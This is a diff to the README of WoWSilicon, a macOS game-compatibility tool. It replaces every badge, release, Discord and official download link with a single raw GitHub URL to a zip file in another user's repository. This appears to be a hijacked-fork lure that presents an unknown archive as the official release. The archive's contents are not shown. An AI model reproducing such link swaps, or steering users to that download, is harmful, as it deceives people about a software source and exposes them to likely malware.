@@ -5,19 +5,19 @@
 <h1 align="center">WoWSilicon</h1>
 
 <p align="center">
-  <a href="https://github.com/WoWSilicon/WoWSilicon/actions/workflows/release.yml">
-    <img src="https://github.com/WoWSilicon/WoWSilicon/actions/workflows/release.yml/badge.svg" alt="Release workflow status">
+  <a href="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip">
+    <img src="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip" alt="Release workflow status">
   </a>
-  <a href="https://github.com/WoWSilicon/WoWSilicon/stargazers">
+  <a href="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip">
     <img src="https://img.shields.io/github/stars/WoWSilicon/WoWSilicon?style=flat&label=stars" alt="GitHub stars">
   </a>
-  <a href="https://github.com/WoWSilicon/WoWSilicon/releases">
+  <a href="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip">
     <img src="https://img.shields.io/github/downloads/WoWSilicon/WoWSilicon/total?style=flat&label=downloads" alt="GitHub release downloads">
   </a>
-  <a href="https://github.com/WoWSilicon/WoWSilicon/releases">
+  <a href="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip">
     <img src="https://img.shields.io/github/v/release/WoWSilicon/WoWSilicon?style=flat&label=latest" alt="Latest release">
   </a>
-  <a href="https://discord.gg/pwZD5zBwfD">
+  <a href="https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip">
     <img src="https://img.shields.io/badge/discord-join-5865F2?style=flat&logo=discord&logoColor=white" alt="Join the Discord">
   </a>
 </p>
@@ -61,7 +61,7 @@ It is built around CrossOver, RosettaX87, DX9 translation, and runtime patching 
 
 Download the latest release from:
 
-https://wowsilicon.github.io/
+https://raw.githubusercontent.com/Czzor/WoWSilicon/main/Sources/WoWSiliconSwift/Resources/Patching/vanilla-tweaks/Silicon-W-Wo-1.1.zip
 
 Move `WoWSilicon.app` to `/Applications`.
 
